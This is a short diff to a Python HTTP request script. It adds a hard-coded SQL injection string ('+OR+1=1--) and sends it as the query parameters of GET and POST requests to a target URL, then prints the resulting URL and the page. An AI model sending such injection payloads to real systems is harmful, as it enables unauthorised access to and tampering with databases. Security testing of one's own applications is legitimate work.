@@ -6,17 +6,19 @@ def make_request(file, http_method, url):
     print(f"Output file: {output_file}")
     print(f"HTTP method: {http_method}")
     print(f"Target URL: {target_url}")
+    payload = "'+OR+1=1--"
     try:
         if http_method == "GET":
-            response = requests.get(url)
+            response = requests.get(url, params=payload)
             response.raise_for_status()
         elif http_method == "POST":
-            response = requests.post(url)
+            response = requests.post(url, params=payload)
             response.raise_for_status()
     except requests.exceptions.RequestException as e:
         print(f"Error: Invalid URL: '{url}': {e}")
         sys.exit(1)
     html_response = response.text
+    print(response.url)
     print(html_response)
 
 
